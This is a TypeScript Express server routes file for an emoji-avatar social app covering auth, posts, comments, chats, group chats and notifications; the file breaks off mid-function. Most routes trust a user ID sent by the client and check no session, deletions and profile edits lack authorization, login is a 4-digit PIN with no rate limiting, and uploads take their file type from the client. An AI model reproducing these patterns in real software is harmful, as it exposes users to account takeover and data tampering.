import { createServer } from "http";
import express, { type Request, Response, NextFunction } from "express";
import { storage } from "./storage";
import { insertPostSchema, insertCommentSchema, insertMessageSchema, insertChatSchema, insertChatSettingsSchema, insertReportSchema, insertPushTokenSchema, chats, groupChatMembers, messages } from "@shared/schema";
import { db } from "./db";
import { eq } from "drizzle-orm";
import { z } from "zod";
import { moderateUsername } from "./moderation";
import * as fs from "fs";
import * as path from "path";
import { randomUUID } from "crypto";
import { sendNewMessageNotification, sendLikeNotification, sendCommentNotification } from "./push-notifications";

const EMOJIS = ["🐸", "🦊", "🐻", "🐼", "🦁", "🐯", "🐨", "🐮", "🐷", "🐵", "🐔", "🐧", "🐦", "🦆", "🦅", "🦉", "🦇", "🐺", "🐗", "🐴", "🦄", "🐝", "🐛", "🦋", "🐌", "🐞", "🐜", "🦟", "🦗", "🕷", "🦂", "🐢", "🐍", "🦎", "🦖", "🦕", "🐙", "🦑", "🦐", "🦞", "🦀", "🐡", "🐠", "🐟", "🐬", "🐳", "🐋", "🦈", "🐊", "🐅", "🐆", "🦓", "🦍", "🦧", "🐘", "🦛", "🦏", "🐪", "🐫", "🦒", "🦘", "🐃", "🐂", "🐄", "🐎", "🐖", "🐏", "🐑", "🦙", "🐐", "🦌", "🐕", "🐩", "🦮", "🐕‍🦺", "🐈", "🐈‍⬛", "🐓", "🦃", "🦚", "🦜", "🦢", "🦩", "🕊", "🐇", "🦝", "🦨", "🦡", "🦫", "🦦", "🦥", "🐁", "🐀", "🐿", "🦔"];

export async function registerRoutes(app: express.Express) {
  // Auth routes
  app.post("/api/auth/register", async (req, res) => {
    try {
      const { username, pin } = req.body;
      
      if (!username || !pin) {
        return res.status(400).json({ error: "Username and PIN required" });
      }

      if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
        return res.status(400).json({ error: "PIN must be 4 digits" });
      }

      // Moderate username for offensive content
      const moderationResult = await moderateUsername(username);
      if (!moderationResult.isAllowed) {
        return res.status(400).json({ 
          error: moderationResult.reason || "This username is not allowed" 
        });
      }

      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return res.status(400).json({ error: "Username already taken" });
      }

      const emoji = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
      const user = await storage.createUser({ username, pin, emoji });
      
      const session = await storage.createSession({
        userId: user.id,
        deviceInfo: req.headers["user-agent"] || "Unknown device",
      });

      res.json({ user: { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified, isAdmin: user.isAdmin, isBanned: user.isBanned }, session });
    } catch (error) {
      console.error("Register error:", error);
      res.status(500).json({ error: "Failed to register" });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      const { userId, pin } = req.body;
      
      if (!userId || !pin) {
        return res.status(400).json({ error: "User ID and PIN required" });
      }

      let user = await storage.getUserByIdAndPin(userId, pin);
      
      if (!user) {
        const userByUsername = await storage.getUserByUsername(userId.trim());
        if (userByUsername) {
          user = await storage.getUserByIdAndPin(userByUsername.id, pin);
        }
      }
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      if (user.isBanned) {
        return res.status(403).json({ error: "Your account is banned" });
      }

      await storage.updateUserLastSeen(user.id);
      
      const session = await storage.createSession({
        userId: user.id,
        deviceInfo: req.headers["user-agent"] || "Unknown device",
      });

      res.json({ user: { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified, isAdmin: user.isAdmin, isBanned: user.isBanned }, session });
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ error: "Failed to login" });
    }
  });

  app.post("/api/auth/logout", async (req, res) => {
    try {
      const { sessionId } = req.body;
      if (sessionId) {
        await storage.deleteSession(sessionId);
      }
      res.json({ success: true });
    } catch (error) {
      console.error("Logout error:", error);
      res.status(500).json({ error: "Failed to logout" });
    }
  });

  app.get("/api/users/:id/sessions", async (req, res) => {
    try {
      const sessions = await storage.getUserSessions(req.params.id);
      res.json(sessions);
    } catch (error) {
      console.error("Get sessions error:", error);
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  // Image upload endpoint
  app.post("/api/upload", async (req, res) => {
    try {
      const { image } = req.body;
      
      if (!image) {
        return res.status(400).json({ error: "No image data provided" });
      }

      // Extract base64 data (handle both raw base64 and data URL formats)
      let base64Data = image;
      let extension = "jpg";
      
      if (image.startsWith("data:")) {
        const matches = image.match(/^data:image\/(\w+);base64,(.+)$/);
        if (matches) {
          extension = matches[1] === "jpeg" ? "jpg" : matches[1];
          base64Data = matches[2];
        }
      }

      const fileName = `${randomUUID()}.${extension}`;
      const uploadsDir = path.resolve(process.cwd(), "uploads");
      
      // Ensure uploads directory exists
      if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
      }

      const filePath = path.join(uploadsDir, fileName);
      
      // Write file
      fs.writeFileSync(filePath, Buffer.from(base64Data, "base64"));

      // Return relative path - client will build full URL using EXPO_PUBLIC_DOMAIN
      const relativePath = `/uploads/${fileName}`;

      res.json({ url: relativePath });
    } catch (error) {
      console.error("Upload error:", error);
      res.status(500).json({ error: "Failed to upload image" });
    }
  });

  app.delete("/api/sessions/:id", async (req, res) => {
    try {
      await storage.deleteSession(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Delete session error:", error);
      res.status(500).json({ error: "Failed to delete session" });
    }
  });

  app.get("/api/users/:id/posts", async (req, res) => {
    try {
      const posts = await storage.getUserPosts(req.params.id);
      const postsWithUser = await Promise.all(posts.map(async (post) => {
        const user = await storage.getUser(post.userId);
        const likesCount = await storage.getPostLikesCount(post.id);
        const commentsCount = await storage.getPostCommentsCount(post.id);
        const currentUserId = req.headers["x-user-id"] as string;
        const isLiked = currentUserId ? !!(await storage.getLike(currentUserId, post.id)) : false;
        const isSaved = currentUserId ? (await storage.getUserSaves(currentUserId)).some(s => s.postId === post.id) : false;
        
        return {
          ...post,
          user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
          likesCount,
          commentsCount,
          isLiked,
          isSaved
        };
      }));
      res.json(postsWithUser);
    } catch (error) {
      console.error("Get user posts error:", error);
      res.status(500).json({ error: "Failed to get user posts" });
    }
  });

  // Users routes
  app.get("/api/users/by-username/:username", async (req, res) => {
    try {
      const user = await storage.getUserByUsername(req.params.username);
      if (!user) return res.status(404).json({ error: "User not found" });
      res.json({ id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified, isAdmin: user.isAdmin, isBanned: user.isBanned });
    } catch (error) {
      console.error("Get user by username error:", error);
      res.status(500).json({ error: "Failed to get user" });
    }
  });

  app.get("/api/users/search", async (req, res) => {
    try {
      const query = req.query.q as string;
      if (!query) return res.json([]);
      const results = await storage.searchUsers(query);
      res.json(results.map(u => ({ id: u.id, username: u.username, emoji: u.emoji, isVerified: u.isVerified })));
    } catch (error) {
      console.error("Search users error:", error);
      res.status(500).json({ error: "Failed to search users" });
    }
  });

  app.get("/api/users/:id", async (req, res) => {
    try {
      const user = await storage.getUser(req.params.id);
      if (!user) return res.status(404).json({ error: "User not found" });
      res.json({ id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified, isAdmin: user.isAdmin, isBanned: user.isBanned, lastUsernameChange: user.lastUsernameChange });
    } catch (error) {
      console.error("Get user error:", error);
      res.status(500).json({ error: "Failed to get user" });
    }
  });

  app.patch("/api/users/:id/profile", async (req, res) => {
    try {
      const { emoji, username } = req.body;
      const userId = req.params.id;
      
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (!emoji) {
        return res.status(400).json({ error: "Emoji is required" });
      }

      let usernameToUpdate: string | undefined;
      
      if (username && username !== user.username) {
        if (!user.isAdmin) {
          if (user.lastUsernameChange) {
            const lastChange = new Date(user.lastUsernameChange);
            const now = new Date();
            const daysSinceChange = Math.floor((now.getTime() - lastChange.getTime()) / (1000 * 60 * 60 * 24));
            if (daysSinceChange < 20) {
              const daysLeft = 20 - daysSinceChange;
              return res.status(400).json({ 
                error: `You can change your username in ${daysLeft} days` 
              });
            }
          }
        }

        if (username.length < 2 || username.length > 20) {
          return res.status(400).json({ error: "Username must be 2-20 characters" });
        }

        const existingUser = await storage.getUserByUsername(username);
        if (existingUser && existingUser.id !== userId) {
          return res.status(400).json({ error: "Username already taken" });
        }

        const moderationResult = await moderateUsername(username);
        if (!moderationResult.isAllowed) {
          return res.status(400).json({ 
            error: moderationResult.reason || "This username is not allowed" 
          });
        }

        usernameToUpdate = username;
      }

      const updated = await storage.updateUserProfile(userId, emoji, usernameToUpdate);
      
      res.json({ 
        id: updated.id, 
        username: updated.username, 
        emoji: updated.emoji, 
        isVerified: updated.isVerified, 
        isAdmin: updated.isAdmin, 
        isBanned: updated.isBanned,
        lastUsernameChange: updated.lastUsernameChange
      });
    } catch (error) {
      console.error("Update profile error:", error);
      res.status(500).json({ error: "Failed to update profile" });
    }
  });

  // Posts routes
  app.get("/api/posts", async (req, res) => {
    try {
      const limit = Math.min(parseInt(req.query.limit as string) || 10, 50);
      const offset = parseInt(req.query.offset as string) || 0;
      const posts = await storage.getPosts(limit, offset);
      const postsWithUser = await Promise.all(posts.map(async (post) => {
        const user = await storage.getUser(post.userId);
        const likesCount = await storage.getPostLikesCount(post.id);
        const commentsCount = await storage.getPostCommentsCount(post.id);
        const currentUserId = req.headers["x-user-id"] as string;
        const isLiked = currentUserId ? !!(await storage.getLike(currentUserId, post.id)) : false;
        const isSaved = currentUserId ? (await storage.getUserSaves(currentUserId)).some(s => s.postId === post.id) : false;
        
        return {
          ...post,
          user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
          likesCount,
          commentsCount,
          isLiked,
          isSaved
        };
      }));
      res.json(postsWithUser);
    } catch (error) {
      console.error("Get posts error:", error);
      res.status(500).json({ error: "Failed to get posts" });
    }
  });

  app.post("/api/posts", async (req, res) => {
    try {
      const postData = insertPostSchema.parse(req.body);
      const post = await storage.createPost(postData);
      res.json(post);
    } catch (error) {
      console.error("Create post error:", error);
      res.status(400).json({ error: "Invalid post data" });
    }
  });

  app.get("/api/posts/:id", async (req, res) => {
    try {
      const post = await storage.getPost(req.params.id);
      if (!post) return res.status(404).json({ error: "Post not found" });
      
      const user = await storage.getUser(post.userId);
      const likesCount = await storage.getPostLikesCount(post.id);
      const commentsCount = await storage.getPostCommentsCount(post.id);
      const currentUserId = req.headers["x-user-id"] as string;
      const isLiked = currentUserId ? !!(await storage.getLike(currentUserId, post.id)) : false;
      const isSaved = currentUserId ? (await storage.getUserSaves(currentUserId)).some(s => s.postId === post.id) : false;

      res.json({
        ...post,
        user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
        likesCount,
        commentsCount,
        isLiked,
        isSaved
      });
    } catch (error) {
      console.error("Get post error:", error);
      res.status(500).json({ error: "Failed to get post" });
    }
  });

  app.patch("/api/posts/:id", async (req, res) => {
    try {
      const { caption, location, feeling, latitude, longitude, imageUrl, userId } = req.body;
      const post = await storage.getPost(req.params.id);
      
      if (!post) {
        return res.status(404).json({ error: "Post not found" });
      }

      if (post.userId !== userId) {
        return res.status(403).json({ error: "Unauthorized" });
      }

      const updatedPost = await storage.updatePost(req.params.id, { 
        caption, 
        location, 
        feeling,
        latitude: latitude?.toString(), 
        longitude: longitude?.toString(),
        imageUrl 
      });
      res.json(updatedPost);
    } catch (error) {
      console.error("Update post error:", error);
      res.status(500).json({ error: "Failed to update post" });
    }
  });

  app.delete("/api/posts/:id", async (req, res) => {
    try {
      await storage.deletePost(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Delete post error:", error);
      res.status(500).json({ error: "Failed to delete post" });
    }
  });

  // Likes routes
  app.post("/api/posts/:id/like", async (req, res) => {
    try {
      const userId = req.body.userId;
      if (!userId) return res.status(400).json({ error: "User ID required" });
      
      const existing = await storage.getLike(userId, req.params.id);
      if (existing) {
        await storage.deleteLike(userId, req.params.id);
        res.json({ liked: false });
      } else {
        await storage.createLike({ userId, postId: req.params.id });
        
        // Send push notification for new like
        const post = await storage.getPost(req.params.id);
        const liker = await storage.getUser(userId);
        if (post && liker && post.userId !== userId) {
          sendLikeNotification(post.userId, liker.username, liker.emoji, post.id);
        }
        
        res.json({ liked: true });
      }
    } catch (error) {
      console.error("Like post error:", error);
      res.status(500).json({ error: "Failed to like post" });
    }
  });

  // Saves routes
  app.get("/api/users/:id/saves", async (req, res) => {
    try {
      const saves = await storage.getUserSaves(req.params.id);
      const posts = await Promise.all(saves.map(async (save) => {
        const post = await storage.getPost(save.postId);
        if (!post) return null;
        const user = await storage.getUser(post.userId);
        const likesCount = await storage.getPostLikesCount(post.id);
        const commentsCount = await storage.getPostCommentsCount(post.id);
        
        return {
          ...post,
          user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
          likesCount,
          commentsCount,
          isLiked: false, // Client should determine this
          isSaved: true
        };
      }));
      res.json(posts.filter(p => p !== null));
    } catch (error) {
      console.error("Get saves error:", error);
      res.status(500).json({ error: "Failed to get saves" });
    }
  });

  app.post("/api/saves", async (req, res) => {
    try {
      const { userId, postId } = req.body;
      if (!userId || !postId) return res.status(400).json({ error: "User ID and Post ID required" });
      
      const saves = await storage.getUserSaves(userId);
      const existing = saves.find(s => s.postId === postId);
      
      if (existing) {
        await storage.deleteSave(userId, postId);
        res.json({ saved: false });
      } else {
        await storage.createSave({ userId, postId });
        res.json({ saved: true });
      }
    } catch (error) {
      console.error("Create save error:", error);
      res.status(500).json({ error: "Failed to save post" });
    }
  });

  app.delete("/api/saves/:postId", async (req, res) => {
    try {
      const userId = req.body.userId || req.query.userId;
      if (!userId) return res.status(400).json({ error: "User ID required" });
      
      await storage.deleteSave(userId, req.params.postId);
      res.json({ saved: false });
    } catch (error) {
      console.error("Delete save error:", error);
      res.status(500).json({ error: "Failed to delete save" });
    }
  });

  // Comments routes
  app.get("/api/posts/:id/comments", async (req, res) => {
    try {
      const comments = await storage.getPostComments(req.params.id);
      const commentsWithUser = await Promise.all(comments.map(async (comment) => {
        const user = await storage.getUser(comment.userId);
        return {
          ...comment,
          user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined
        };
      }));
      res.json(commentsWithUser);
    } catch (error) {
      console.error("Get comments error:", error);
      res.status(500).json({ error: "Failed to get comments" });
    }
  });

  app.post("/api/posts/:id/comments", async (req, res) => {
    try {
      const commentData = insertCommentSchema.parse({ ...req.body, postId: req.params.id });
      const comment = await storage.createComment(commentData);
      const user = await storage.getUser(comment.userId);
      
      // Send push notification for new comment
      const post = await storage.getPost(req.params.id);
      if (post && user && post.userId !== comment.userId) {
        sendCommentNotification(post.userId, user.username, user.emoji, comment.content, post.id);
      }
      
      res.json({
        ...comment,
        user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined
      });
    } catch (error) {
      console.error("Create comment error:", error);
      res.status(400).json({ error: "Invalid comment data" });
    }
  });

  // Chats routes
  app.get("/api/users/:id/chats", async (req, res) => {
    try {
      const userChats = await storage.getUserChats(req.params.id);
      const chatsWithUsers = await Promise.all(userChats.map(async (chat) => {
        if (chat.isGroup) {
          const members = await storage.getGroupChatMembers(chat.id);
          const memberUsers = await Promise.all(members.map(async (m) => {
            const u = await storage.getUser(m.userId);
            return u ? { id: u.id, username: u.username, emoji: u.emoji, isVerified: u.isVerified } : null;
          }));
          const lastMessages = await storage.getChatMessages(chat.id, 1);
          const unreadCount = await storage.getUnreadMessagesCount(chat.id, req.params.id);
          return {
            ...chat,
            members: memberUsers.filter(Boolean),
            lastMessage: lastMessages[0] || null,
            unreadCount,
          };
        }

        const otherUserId = chat.user1Id === req.params.id ? chat.user2Id : chat.user1Id;
        const otherUser = await storage.getUser(otherUserId);
        const lastMessages = await storage.getChatMessages(chat.id, 1);
        const unreadCount = await storage.getUnreadMessagesCount(chat.id, req.params.id);
        return {
          ...chat,
          otherUser: otherUser ? { id: otherUser.id, username: otherUser.username, emoji: otherUser.emoji, isVerified: otherUser.isVerified } : undefined,
          lastMessage: lastMessages[0] || null,
          unreadCount,
        };
      }));
      res.json(chatsWithUsers);
    } catch (error) {
      console.error("Get chats error:", error);
      res.status(500).json({ error: "Failed to get chats" });
    }
  });

  app.post("/api/chats", async (req, res) => {
    try {
      const chatData = insertChatSchema.parse(req.body);
      const existing = await storage.getChatByUsers(chatData.user1Id, chatData.user2Id);
      if (existing) return res.json(existing);
      const chat = await storage.createChat(chatData);
      res.json(chat);
    } catch (error) {
      console.error("Create chat error:", error);
      res.status(400).json({ error: "Invalid chat data" });
    }
  });

  // Group chat routes
  app.post("/api/group-chats", async (req, res) => {
    try {
      const { name, groupEmoji, creatorId, memberIds } = req.body;
      if (!name || !creatorId || !memberIds || memberIds.length < 1) {
        return res.status(400).json({ error: "Name, creator, and at least 1 member required" });
      }
      const [chat] = await db.insert(chats).values({
        user1Id: creatorId,
        user2Id: creatorId,
        isGroup: true,
        name,
        groupEmoji: groupEmoji || null,
      }).returning();

      await storage.addGroupChatMember({ chatId: chat.id, userId: creatorId, role: "admin" });

      for (const memberId of memberIds) {
        if (memberId !== creatorId) {
          await storage.addGroupChatMember({ chatId: chat.id, userId: memberId, role: "member" });
        }
      }

      res.json(chat);
    } catch (error) {
      console.error("Create group chat error:", error);
      res.status(500).json({ error: "Failed to create group chat" });
    }
  });

  app.get("/api/group-chats/:id/members", async (req, res) => {
    try {
      const members = await storage.getGroupChatMembers(req.params.id);
      const membersWithUsers = await Promise.all(members.map(async (member) => {
        const user = await storage.getUser(member.userId);
        return {
          ...member,
          user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
        };
      }));
      res.json(membersWithUsers);
    } catch (error) {
      console.error("Get group members error:", error);
      res.status(500).json({ error: "Failed to get members" });
    }
  });

  app.post("/api/group-chats/:id/members", async (req, res) => {
    try {
      const { userId } = req.body;
      if (!userId) return res.status(400).json({ error: "userId required" });
      const member = await storage.addGroupChatMember({ chatId: req.params.id, userId, role: "member" });
      res.json(member);
    } catch (error) {
      console.error("Add group member error:", error);
      res.status(500).json({ error: "Failed to add member" });
    }
  });

  app.delete("/api/group-chats/:id/members/:userId", async (req, res) => {
    try {
      await storage.removeGroupChatMember(req.params.id, req.params.userId);
      res.json({ success: true });
    } catch (error) {
      console.error("Remove group member error:", error);
      res.status(500).json({ error: "Failed to remove member" });
    }
  });

  app.patch("/api/group-chats/:id", async (req, res) => {
    try {
      const { name, groupEmoji, backgroundImage } = req.body;
      const [updated] = await db.update(chats).set({
        ...(name !== undefined ? { name } : {}),
        ...(groupEmoji !== undefined ? { groupEmoji } : {}),
        ...(backgroundImage !== undefined ? { backgroundImage } : {}),
      }).where(eq(chats.id, req.params.id)).returning();
      res.json(updated);
    } catch (error) {
      console.error("Update group chat error:", error);
      res.status(500).json({ error: "Failed to update group chat" });
    }
  });

  app.patch("/api/chats/:id/background", async (req, res) => {
    try {
      const { backgroundImage } = req.body;
      const [updated] = await db.update(chats).set({
        backgroundImage: backgroundImage || null,
      }).where(eq(chats.id, req.params.id)).returning();
      res.json(updated);
    } catch (error) {
      console.error("Update chat background error:", error);
      res.status(500).json({ error: "Failed to update chat background" });
    }
  });

  app.get("/api/chats/:id", async (req, res) => {
    try {
      const [chat] = await db.select().from(chats).where(eq(chats.id, req.params.id));
      if (!chat) return res.status(404).json({ error: "Chat not found" });
      res.json(chat);
    } catch (error) {
      console.error("Get chat error:", error);
      res.status(500).json({ error: "Failed to get chat" });
    }
  });

  app.delete("/api/chats/:id", async (req, res) => {
    try {
      const chatId = req.params.id;
      await db.delete(messages).where(eq(messages.chatId, chatId));
      await db.delete(groupChatMembers).where(eq(groupChatMembers.chatId, chatId));
      await db.delete(chats).where(eq(chats.id, chatId));
      res.json({ success: true });
    } catch (error) {
      console.error("Delete chat error:", error);
      res.status(500).json({ error: "Failed to delete chat" });
    }
  });

  app.get("/api/chats/:id/messages", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 20;
      const offset = parseInt(req.query.offset as string) || 0;
      
      const messages = await storage.getChatMessages(req.params.id, limit, offset);
      
      // Fetch reactions for all messages in a batch
      const messagesWithReactions = await Promise.all(
        messages.map(async (msg) => {
          const reactions = await storage.getMessageReactions(msg.id);
          return { ...msg, reactions };
        })
      );
      
      res.json(messagesWithReactions);
    } catch (error) {
      console.error("Get messages error:", error);
      res.status(500).json({ error: "Failed to get messages" });
    }
  });

  app.post("/api/messages", async (req, res) => {
    try {
      const messageData = insertMessageSchema.parse(req.body);
      const message = await storage.createMessage(messageData);
      
      // Send push notification for new message
      const chat = await storage.getChat(messageData.chatId);
      const sender = await storage.getUser(messageData.senderId);
      if (chat && sender) {
        if (chat.isGroup) {
          const members = await storage.getGroupChatMembers(chat.id);
          for (const member of members) {
            if (member.userId !== messageData.senderId) {
              sendNewMessageNotification(member.userId, sender.username, sender.emoji, messageData.content, chat.id);
            }
          }
        } else {
          const recipientId = chat.user1Id === messageData.senderId ? chat.user2Id : chat.user1Id;
          sendNewMessageNotification(recipientId, sender.username, sender.emoji, messageData.content, chat.id);
        }
      }
      
      res.json(message);
    } catch (error) {
      console.error("Create message error:", error);
      res.status(400).json({ error: "Invalid message data" });
    }
  });

  app.patch("/api/messages/:id", async (req, res) => {
    try {
      const { content, senderId } = req.body;
      const message = await storage.getMessage(req.params.id);
      
      if (!message) {
        return res.status(404).json({ error: "Message not found" });
      }

      if (message.senderId !== senderId) {
        return res.status(403).json({ error: "Unauthorized" });
      }

      const updated = await storage.updateMessage(req.params.id, content);
      res.json(updated);
    } catch (error) {
      console.error("Update message error:", error);
      res.status(500).json({ error: "Failed to update message" });
    }
  });

  // Message Reactions
  app.get("/api/messages/:messageId/reactions", async (req, res) => {
    try {
      const reactions = await storage.getMessageReactions(req.params.messageId);
      res.json(reactions);
    } catch (error) {
      console.error("Get reactions error:", error);
      res.status(500).json({ error: "Failed to get reactions" });
    }
  });

  app.post("/api/messages/:messageId/reactions", async (req, res) => {
    try {
      const { userId, emoji } = req.body;
      if (!userId || !emoji) {
        return res.status(400).json({ error: "userId and emoji are required" });
      }
      const reaction = await storage.addMessageReaction({
        messageId: req.params.messageId,
        userId,
        emoji,
      });
      res.json(reaction);
    } catch (error) {
      console.error("Add reaction error:", error);
      res.status(500).json({ error: "Failed to add reaction" });
    }
  });

  app.delete("/api/messages/:messageId/reactions", async (req, res) => {
    try {
      const { userId, emoji } = req.body;
      if (!userId || !emoji) {
        return res.status(400).json({ error: "userId and emoji are required" });
      }
      await storage.removeMessageReaction(req.params.messageId, userId, emoji);
      res.json({ success: true });
    } catch (error) {
      console.error("Remove reaction error:", error);
      res.status(500).json({ error: "Failed to remove reaction" });
    }
  });

  // In-memory typing status store
  const typingStatus: Map<string, { userId: string; timestamp: number }> = new Map();
  
  // Post typing status
  app.post("/api/chats/:id/typing", async (req, res) => {
    try {
      const { userId } = req.body;
      const chatId = req.params.id;
      const key = `${chatId}:${userId}`;
      typingStatus.set(key, { userId, timestamp: Date.now() });
      res.json({ success: true });
    } catch (error) {
      console.error("Set typing status error:", error);
      res.status(500).json({ error: "Failed to set typing status" });
    }
  });
  
  // Get typing status for a specific user in a chat
  app.get("/api/chats/:id/typing/:userId", async (req, res) => {
    try {
      const chatId = req.params.id;
      const targetUserId = req.params.userId;
      const key = `${chatId}:${targetUserId}`;
      const status = typingStatus.get(key);
      
      // Typing expires after 3 seconds
      const isTyping = status && (Date.now() - status.timestamp) < 3000;
      
      // Clean up expired status
      if (!isTyping && status) {
        typingStatus.delete(key);
      }
      
      res.json({ isTyping: !!isTyping });
    } catch (error) {
      console.error("Get typing status error:", error);
      res.status(500).json({ error: "Failed to get typing status" });
    }
  });
  
  app.post("/api/chats/:id/read", async (req, res) => {
    try {
      const { userId } = req.body;
      await storage.markMessagesAsRead(req.params.id, userId);
      res.json({ success: true });
    } catch (error) {
      console.error("Read messages error:", error);
      res.status(500).json({ error: "Failed to mark as read" });
    }
  });

  app.get("/api/users/:id/messages/unread", async (req, res) => {
    try {
      const count = await storage.getTotalUnreadMessagesCount(req.params.id);
      res.json({ count });
    } catch (error) {
      console.error("Get total unread error:", error);
      res.status(500).json({ error: "Failed to get unread count" });
    }
  });

  app.delete("/api/messages/:id", async (req, res) => {
    try {
      const { senderId } = req.body;
      const message = await storage.getMessage(req.params.id);
      
      if (!message) {
        return res.status(404).json({ error: "Message not found" });
      }

      // Allow deletion if it's the sender OR an admin
      const user = senderId ? await storage.getUser(senderId) : null;
      if (message.senderId !== senderId && !user?.isAdmin) {
        return res.status(403).json({ error: "Unauthorized" });
      }

      await storage.deleteMessage(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Delete message error:", error);
      res.status(500).json({ error: "Failed to delete message" });
    }
  });
  app.get("/api/users/:id/unread-messages", async (req, res) => {
    try {
      const count = await storage.getTotalUnreadMessagesCount(req.params.id);
      res.json({ count });
    } catch (error) {
      console.error("Get total unread error:", error);
      res.status(500).json({ error: "Failed to get unread count" });
    }
  });

  // Notifications routes
  app.get("/api/users/:id/notifications", async (req, res) => {
    try {
      const notifications = await storage.getUserNotifications(req.params.id);
      const notificationsWithUser = await Promise.all(notifications.map(async (notification) => {
        if (notification.fromUserId) {
          const fromUser = await storage.getUser(notification.fromUserId);
          return {
            ...notification,
            fromUser: fromUser ? { id: fromUser.id, username: fromUser.username, emoji: fromUser.emoji, isVerified: fromUser.isVerified } : undefined,
          };
        }
        return notification;
      }));
      res.json(notificationsWithUser);
    } catch (error) {
      console.error("Get notifications error:", error);
      res.status(500).json({ error: "Failed to get notifications" });
    }
  });

  app.get("/api/users/:id/notifications/unread", async (req, res) => {
    try {
      const count = await storage.getUnreadNotificationsCount(req.params.id);
      res.json({ count });
    } catch (error) {
      console.error("Get unread notifications error:", error);
      res.status(500).json({ error: "Failed to get unread count" });
    }
  });

  app.post("/api/notifications/:id/read", async (req, res) => {
    try {
      await storage.markNotificationAsRead(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Mark notification read error:", error);
      res.status(500).json({ error: "Failed to mark as read" });
    }
  });

  app.post("/api/users/:id/notifications/read-all", async (req, res) => {
    try {
      await storage.markAllNotificationsAsRead(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Mark all read error:", error);
      res.status(500).json({ error: "Failed to mark all as read" });
    }
  });

  // Hidden users routes
  app.get("/api/users/:id/hidden", async (req, res) => {
    try {
      const hiddenUserIds = await storage.getHiddenUsers(req.params.id);
      res.json(hiddenUserIds);
    } catch (error) {
      console.error("Get hidden users error:", error);
      res.status(500).json({ error: "Failed to get hidden users" });
    }
  });

  app.post("/api/users/:id/hidden", async (req, res) => {
    try {
      const { hiddenUserId } = req.body;
      await storage.hideUser(req.params.id, hiddenUserId);
      res.json({ success: true });
    } catch (error) {
      console.error("Hide user error:", error);
      res.status(500).json({ error: "Failed to hide user" });
    }
  });

  app.delete("/api/users/:id/hidden/:hiddenUserId", async (req, res) => {
    try {
      await storage.unhideUser(req.params.id, req.params.hiddenUserId);
      res.json({ success: true });
    } catch (error) {
      console.error("Unhide user error:", error);
      res.status(500).json({ error: "Failed to unhide user" });
    }
  });

  // Archived posts routes
  app.get("/api/users/:id/archived", async (req, res) => {
    try {
      const archivedIds = await storage.getArchivedPosts(req.params.id);
      const allUserPosts = await storage.getUserPosts(req.params.id);
      
      const archivedPosts = await Promise.all(allUserPosts
        .filter(post => archivedIds.includes(post.id))
        .map(async (post) => {
          const user = await storage.getUser(post.userId);
          const likesCount = await storage.getPostLikesCount(post.id);
          const commentsCount = await storage.getPostCommentsCount(post.id);
          
          return {
            ...post,
            user: user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : undefined,
            likesCount,
            commentsCount,
            isLiked: false,
            isSaved: false
          };
        })
      );
      
      res.json(archivedPosts);
    } catch (error) {
      console.error("Get archived posts error:", error);
      res.status(500).json({ error: "Failed to get archived posts" });
    }
  });

  app.post("/api/users/:id/archived", async (req, res) => {
    try {
      const { postId } = req.body;
      await storage.archivePost(req.params.id, postId);
      res.json({ success: true });
    } catch (error) {
      console.error("Archive post error:", error);
      res.status(500).json({ error: "Failed to archive post" });
    }
  });

  app.delete("/api/users/:id/archived/:postId", async (req, res) => {
    try {
      await storage.unarchivePost(req.params.id, req.params.postId);
      res.json({ success: true });
    } catch (error) {
      console.error("Unarchive post error:", error);
      res.status(500).json({ error: "Failed to unarchive post" });
    }
  });

  // Chat settings routes
  app.get("/api/users/:id/chat-settings", async (req, res) => {
    try {
      const settings = await storage.getAllChatSettings(req.params.id);
      res.json(settings);
    } catch (error) {
      console.error("Get chat settings error:", error);
      res.status(500).json({ error: "Failed to get chat settings" });
    }
  });

  app.get("/api/users/:id/chat-settings/:otherUserId", async (req, res) => {
    try {
      const settings = await storage.getChatSettings(req.params.id, req.params.otherUserId);
      res.json(settings || null);
    } catch (error) {
      console.error("Get chat settings error:", error);
      res.status(500).json({ error: "Failed to get chat settings" });
    }
  });

  app.post("/api/users/:id/chat-settings", async (req, res) => {
    try {
      const { otherUserId, nickname, backgroundImage, isGlobal } = req.body;
      const settings = await storage.upsertChatSettings({
        userId: req.params.id,
        otherUserId,
        nickname,
        backgroundImage,
        isGlobal: !!isGlobal,
      });

      // If global is enabled, also update for the other user
      if (isGlobal) {
        await storage.upsertChatSettings({
          userId: otherUserId,
          otherUserId: req.params.id,
          nickname: null, // Don't overwrite their nickname for us
          backgroundImage,
          isGlobal: true,
        });
      } else {
        // If global is disabled, make sure to disable it for the other user too if they had it
        const otherExisting = await storage.getChatSettings(otherUserId, req.params.id);
        if (otherExisting && otherExisting.isGlobal) {
